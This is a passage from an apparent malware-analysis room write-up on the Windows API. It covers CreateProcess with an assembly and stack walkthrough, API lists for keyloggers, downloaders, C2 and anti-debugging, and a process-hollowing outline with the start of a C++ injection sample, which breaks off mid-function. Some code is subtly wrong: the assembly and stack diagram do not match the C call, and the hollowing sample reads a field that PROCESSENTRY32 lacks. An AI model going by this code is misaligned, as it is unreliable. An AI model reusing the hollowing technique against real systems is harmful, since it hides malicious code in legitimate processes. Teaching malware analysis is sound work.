<span class="p">{</span>
    <span class="c1">// Declare a STARTUPINFO structure to specify window properties for the new process</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    
    <span class="c1">// Declare a PROCESS_INFORMATION structure to receive information about the new process</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

    <span class="c1">// Initialize the STARTUPINFO structure to zero to avoid any garbage values</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
    
    <span class="c1">// Set the cb member of STARTUPINFO to its size, which is required by CreateProcess</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
    
    <span class="c1">// Initialize the PROCESS_INFORMATION structure to zero to avoid any garbage values</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>

    <span class="c1">// Attempt to create a new process to run Notepad</span>
    <span class="c1">// Parameters:</span>
    <span class="c1">// - NULL: Application name is not specified separately</span>
    <span class="c1">// - "C:\\Windows\\notepad.exe": Command line to execute</span>
    <span class="c1">// - NULL, NULL: No special security attributes for the process or its primary thread</span>
    <span class="c1">// - FALSE: New process does not inherit handles from the calling process</span>
    <span class="c1">// - 0: No special creation flags</span>
    <span class="c1">// - NULL, NULL: No environment block or current directory specified</span>
    <span class="c1">// - &amp;si: Pointer to the STARTUPINFO structure</span>
    <span class="c1">// - &amp;pi: Pointer to the PROCESS_INFORMATION structure to receive process information</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">notepad.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="c1">// If CreateProcess fails, print an error message with the error code from GetLastError</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateProcess failed (%d).</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Wait for the Notepad process to complete</span>
    <span class="c1">// Parameters:</span>
    <span class="c1">// - pi.hProcess: Handle to the process to wait for</span>
    <span class="c1">// - INFINITE: Wait indefinitely until the process terminates</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>

    <span class="c1">// Close the handle to the process as it's no longer needed</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
    
    <span class="c1">// Close the handle to the primary thread of the process as it's no longer needed</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

    <span class="c1">// Return 0 to indicate successful execution of the program</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>When compiled into assembly, the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function call looks like this:</p> <pre><code class="language-asm">push 0
lea eax, [esp+10h+StartupInfo]
push eax
lea eax, [esp+14h+ProcessInformation]
push eax
push 0
push 0
push 0
push 0
push 0
push 0
push dword ptr [hWnd]
call CreateProcessA
</code></pre> <p>This assembly code pushes the necessary parameters onto the stack in reverse order and then calls the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function. The <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function then launches a new process and returns a handle to the process and its primary thread.</p> <p>This is what the stack layout looks like after pushing every parameters.</p> <pre><code class="language-raw">+--------------------------+
| lpApplicationName        | &lt;-- esp + 0x00 (NULL)
+--------------------------+
| lpStartupInfo            | &lt;-- esp + 0x04 (address calculated by lea)
+--------------------------+
| lpProcessInformation     | &lt;-- esp + 0x08 (address calculated by lea)
+--------------------------+
| lpCurrentDirectory       | &lt;-- esp + 0x0C (NULL)
+--------------------------+
| lpEnvironment            | &lt;-- esp + 0x10 (NULL)
+--------------------------+
| dwCreationFlags          | &lt;-- esp + 0x14 (0)
+--------------------------+
| bInheritHandles          | &lt;-- esp + 0x18 (FALSE)
+--------------------------+
| lpThreadAttributes       | &lt;-- esp + 0x1C (NULL)
+--------------------------+
| lpProcessAttributes      | &lt;-- esp + 0x20 (NULL)
+--------------------------+
| lpCommandLine            | &lt;-- esp + 0x24 (value from hWnd)
+--------------------------+
</code></pre> <p>During malware analysis, identifying the API call and examining the code can help understand the malware’s purpose.</p> <h3 id="questions-3">Questions</h3> <p><strong>When a process is created in suspended state, which hexadecimal value is assigned to the dwCreationFlags parameter?</strong></p> <p>To know that, we have to read the MSDN documentation available <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">here</a>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000004</code></em></p> <h2 id="task-7---common-apis-used-by-malware">Task 7 - Common APIs used by malware</h2> <p>Most malware authors heavily rely on Windows API to accomplish their goals. That is why it is important to know how it is used in different malware variants.</p> <h3 id="keylogger">Keylogger</h3> <p>This type of malware mostly use:</p> <ul> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx</a></strong>: This function installs an application-defined hook procedure into a hook chain in order to monitor and intercept system events such as keystokes or mouse clicks.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate">GetAsyncKeyState</a></strong>: This function retieves the status of a virtual key (ID used to represent keys of a keyboard) when the function is called, to determine if a key is being pressed or released.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate">GetKeyboardState</a></strong>: This function retrieves the status of all virtual keys to determine the status of all keys on the keyboard.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeynametexta">GetKeyNameText</a></strong>: This function retrieves the name of a key to determine the name of the pressed key.</li> </ul> <h3 id="downloader">Downloader</h3> <p>A downloader is a type of malware designed to download other malware onto a victim’s system.</p> <ul> <li><strong><a href="https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)">URLDownloadToFile</a></strong>: This function downloads a file from the internet and saves it to a local file. This can be used to fetch additional malicious code or update the malware.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen">WinHttpOpen</a></strong>: This one itnitializes the WinHTTP API, which can be used to establish an HTTP connection to a rogue remote server.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect">WinHttpConnect</a></strong>: It establishes a connection to a remote server.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest">WinHttpOpenRequest</a></strong>: It enables the ability of doing HTTP requests like <em>GET</em> or <em>POST</em>. …</li> </ul> <p>This is an example given by Microsoft to make HTTP requests with this API:</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">BOOL</span>  <span class="n">bResults</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
              <span class="n">hConnect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
              <span class="n">hRequest</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// Use WinHttpOpen to obtain a session handle.</span>
    <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span>  <span class="s">L"A WinHTTP Example Program/1.0"</span><span class="p">,</span> 
                             <span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span>
                             <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> 
                             <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Specify an HTTP server.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span>
        <span class="n">hConnect</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span> <span class="n">hSession</span><span class="p">,</span> <span class="s">L"www.wingtiptoys.com"</span><span class="p">,</span>
                                   <span class="n">INTERNET_DEFAULT_HTTP_PORT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create an HTTP Request handle.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span>
        <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span> <span class="n">hConnect</span><span class="p">,</span> <span class="s">L"PUT"</span><span class="p">,</span> 
                                       <span class="s">L"/writetst.txt"</span><span class="p">,</span> 
                                       <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> 
                                       <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span>
                                       <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Send a Request.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> 
        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpSendRequest</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> 
                                       <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span>
                                       <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> 
                                       <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// End the request.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span>
        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpReceiveResponse</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// Keep checking for data until there is nothing left.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span>
        <span class="k">do</span> 
        <span class="p">{</span>
            <span class="c1">// Check for available data.</span>
            <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">))</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Error %u in WinHttpQueryDataAvailable.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

            <span class="c1">// Allocate space for the buffer.</span>
            <span class="n">pszOutBuffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">dwSize</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pszOutBuffer</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">dwSize</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="c1">// Read the Data.</span>
                <span class="n">ZeroMemory</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpReadData</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pszOutBuffer</span><span class="p">,</span> 
                                      <span class="n">dwSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDownloaded</span><span class="p">))</span>
                    <span class="n">printf</span><span class="p">(</span> <span class="s">"Error %u in WinHttpReadData.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">else</span>
                    <span class="n">printf</span><span class="p">(</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pszOutBuffer</span><span class="p">);</span>
            
                <span class="c1">// Free the memory allocated to the buffer.</span>
                <span class="k">delete</span> <span class="p">[]</span> <span class="n">pszOutBuffer</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Report any errors.</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bResults</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span> <span class="s">"Error %d has occurred.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

    <span class="c1">// Close any open handles.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
</code></pre></div></div> <h3 id="c2-communication">C2 Communication</h3> <p>Command and Control (C2) communication is a method malware uses to communicate with a remote server. This communication can be used to receive commands from the attacker, send stolen data and more.</p> <ul> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena">InternetOpen</a></strong> This function initializes a session for connection to the internet.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrl</a></strong>: This opens a URL for download, like for downloading malicious code or geting data from a C2 Server.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta">HttpOpenRequest</a></strong>: This function opens HTTP request. Malware can use this function to send HTTP requests to a C2 server and receive commands or additional malicious code.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta">HttpSendRequest</a></strong>: This function sends HTTP request to a C2 server. Malware can use this function to send data or receive commands from a C2 server.</li> </ul> <p>Wininet is designed for desktop applications that require user interaction and features like caching and cookie management, while WinHTTP is optimized for server-side applications and automated tasks without user interaction. Besides these differences, both are suitable for communication using the HTTP protocol even if WinHTTP tends to have better performance. C2 Communication and Downloader can both use Wininet and WinHTTP, nevertheless these are shown here to present the usage of different API.</p> <h3 id="data-exfiltration">Data Exfiltration</h3> <p>Data exfiltration is the unauthorized data transfer from an organization to an external destination.</p> <ul> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile">InternetReadFile</a></strong>: This function reads data from an hRequest handle of <code class="language-plaintext highlighter-rouge">HttpSendRequest</code>. Malware can use this function to steal data from a compromised system and transmit it to a C2 server.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpputfilea">FtpPutFile</a></strong>: This function uploads a file to an FTP Server.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFile</a></strong>: This function creates or opens a file or device to read or modify files containing sensitive information or system configuration data.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile">WriteFile</a></strong>: This function writes data to a file or device.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboarddata">GetClipboardData</a></strong>: This API is used to retrieve data from the clipboard.</li> </ul> <h3 id="dropper">Dropper</h3> <p>A dropper is a malware designed to install other malware onto a victim’s system. Unlike a downloader, a dropper already contains the malicious payload.</p> <ul> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a></strong>: This function creates a new process and its primary thread.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a></strong>: This function allocates a region of memory within the virtual address space of the calling process.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></strong>: This function writes data to an area of memory within the address space of a specified process.</li> </ul> <h3 id="api-hooking">API Hooking</h3> <p>API Hooking is a method malware uses to intercept calls to Windows APIs and modify their behavior. This allows malware to avoid detection by modifying legitimate programs and perform malicious actions.</p> <ul> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a></strong> This function retrieves the address of an exported function or variable from a specified DLL, in order to locate and hook API calls made by other processes.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibrary</a></strong>: This loads a DLL into a process’s address space.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx</a></strong>: This API installs a hook procedure that monitors messages sent to a window or system event, to intercept calls to other Windows APIs and modify their behavior.</li> </ul> <h3 id="anti-debugging-and-vm-detection">Anti-debugging and VM Detection</h3> <p>Theses techniques are used by malware to evade detection and analysis by security researchers.</p> <ul> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent</a></strong>: This function checks whether a process is running under a debugger.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent">CheckRemoteDebuggerPresent</a></strong>: This function checks whether a remote debugger is debugging a process.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess">NtQueryInformationProcess</a></strong>: This one retrieves information about a specified process.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount">GetTickCount</a></strong>: This function gets the number of milliseconds that have elapsed since the system was started.</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a></strong>: This function retrieves a handle to a specified module like VM specific modules (VMWare tools…).</li> <li><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getsystemmetrics">GetSystemMetrics</a></strong>: This function retrieves various system metrics and configuration settings like CPU Revision or if the current session is a remote one.</li> </ul> <p>Anti-debugging / AV detection are discussed in the <a href="https://tryhackme.com/room/antireverseengineering">Anti-Reverse Engineering</a> room and more APIs used for these or other types of malware are discussed one https://malapi.io/.</p> <h2 id="task-8--process-hollowing-overview">Task 8 Process Hollowing: Overview</h2> <p>Process hollowing is a technique used by malware to inject malicious code into a legitimate process running on a victim’s computer. The process is as follow:</p> <ol> <li>Create a legitimate process like notepad and suspend it. <code class="language-plaintext highlighter-rouge">CreateProcessA()</code>/<code class="language-plaintext highlighter-rouge">NtSuspendProcess()</code></li> <li>Allocate new memory of the size of the malicious code in the suspended process and write the code into it. <code class="language-plaintext highlighter-rouge">VirtualAllocEx()</code>/<code class="language-plaintext highlighter-rouge">WriteProcessMemory()</code></li> <li>Modify the entry point of the process to point to the address of the malicious code. <code class="language-plaintext highlighter-rouge">GetThreadContext()</code>/<code class="language-plaintext highlighter-rouge">SetThreadContext()</code></li> <li>Resume the rogued suspended process in order to execute the malicious code. <code class="language-plaintext highlighter-rouge">NtResumeProcess()</code></li> <li>Clean up the process and any ressource used.</li> </ol> <p>To get a better understanding of the technique, a sample C++ code is available below:</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="cm">/**
 * HollowProcess - Replaces the code of a target process with that of a source process.
 * @param szSourceProcessName: Path to the source executable.
 * @param szTargetProcessName: Name of the target process to be hollowed.
 * @return: True if the process hollowing was successful, false otherwise.
 */</span>
<span class="kt">bool</span> <span class="nf">HollowProcess</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">szSourceProcessName</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">szTargetProcessName</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// Take a snapshot of all processes in the system</span>
    <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
    <span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// Iterate over the process list to find the target process</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">do</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="n">szTargetProcessName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="c1">// Open the target process with all access rights</span>
                <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">IMAGE_DOS_HEADER</span> <span class="n">idh</span><span class="p">;</span>
                <span class="n">IMAGE_NT_HEADERS</span> <span class="n">inth</span><span class="p">;</span>
                <span class="n">IMAGE_SECTION_HEADER</span> <span class="n">ish</span><span class="p">;</span>

                <span class="n">DWORD</span> <span class="n">dwRead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

                <span class="c1">// Read the DOS header and NT headers of the target process</span>
                <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idh</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">idh</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>
                <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">idh</span><span class="p">.</span><span class="n">e_lfanew</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inth</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inth</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>

                <span class="c1">// Allocate memory in the target process for the source image</span>
                <span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lpBaseAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="c1">// Write the headers of the source image to the target process</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">,</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="c1">// Write each section of the source image to the target process</span>
                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">inth</span><span class="p">.</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">idh</span><span class="p">.</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_NT_HEADERS</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">))),</span> <span class="o">&amp;</span><span class="n">ish</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ish</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>
                    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpBaseAddress</span> <span class="o">+</span> <span class="n">ish</span><span class="p">.</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">ish</span><span class="p">.</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">ish</span><span class="p">.</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="c1">// Calculate the new entry point for the source image</span>
                <span class="n">DWORD</span> <span class="n">dwEntrypoint</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
